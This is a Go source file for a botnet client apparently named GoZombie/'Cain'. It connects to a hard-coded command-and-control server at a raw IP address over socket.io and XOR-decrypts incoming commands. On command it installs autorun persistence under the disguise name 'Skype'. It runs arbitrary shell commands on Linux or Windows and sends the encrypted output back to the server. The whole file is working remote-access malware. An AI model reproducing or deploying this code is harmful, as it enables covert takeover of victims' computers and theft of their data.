package main

import (
	//"bufio"
	"bytes"
	"fmt"
	"github.com/UPSJustin/GoZombie/zsupport" //support functions
	"github.com/UPSJustin/GoZombie/xor" //xor ftw
	"github.com/zhouhui8915/go-socket.io-client" //websockets
	"log"
	"os"
	"os/exec"
	"runtime"
	"strings"
//	"syscall"
)

var (
	fullPathBotSourceExecFile string = os.Args[0]
	zombieName                string = "Skype"
)





func main() {
	//Key for XOR Encryption
	key := "KCQ"
    
	zsupport.OutMessage("Starting Cain")

	opts := &socketio_client.Options{
		Transport: "websocket",
		Query:     make(map[string]string),
	}

	//c2 channel
	uri := "http://138.197.30.113:80/socket.io/"

	//Create Connection
	client, err := socketio_client.NewClient(uri, opts)
	if err != nil {
		zsupport.OutMessage("Connection Failed to " + fmt.Sprint(uri))
		log.Printf("NewClient error:%v\n", err)
		return
	}

	client.On("error", func() {
		log.Printf("on error\n")
	})

	client.On("connection", func() {
		log.Printf("on connect\n")

	})


	client.On("jnkcyp", func(msgs string) {
		msg := xor.EncryptDecrypt(msgs, key)
		zsupport.OutMessage("DEBUG: " + fmt.Sprint(msg))

		if strings.Contains(msg, "persistence") {

		zsupport.RegisterAutoRun(zombieName, fullPathBotSourceExecFile)

		}

		//execute linux shell
		if strings.Contains(msg, "exec:") {

			output := strings.SplitN(msg, "exec: ", 2)


			if runtime.GOOS != "windows" {

				cmd := exec.Command("/bin/sh", "-c", fmt.Sprintf(`%s`, output[1]))
				
				cmdOutput := &bytes.Buffer{}
				cmd.Stdout = cmdOutput
				err := cmd.Run()
				if err != nil {
					os.Stderr.WriteString(err.Error())
				}
				encryptmsg := xor.EncryptDecrypt(string(cmdOutput.Bytes()), key)
				client.Emit("jnkcyp", encryptmsg)

			}else {
				
				//execute windows shell
				
				output := fmt.Sprintf(`%s`, output[1])

			encryptmsg := zsupport.ExecWindows(output)

				client.Emit("jnkcyp", encryptmsg)			
}
		}
		

	})

	client.On("disconnection", func() {
		log.Printf("on disconnect\n")
	})

	//Read data from console to send custom messages
	//reader := bufio.NewReader(os.Stdin)

	for {
		//data, _, _ := reader.ReadLine()

		//command := string(data)

  		//encrypted := xor.EncryptDecrypt(command, key)

		//client.Emit("jnkcyp", encrypted)
		//log.Printf("send message:%v\n", encrypted)
	}
}
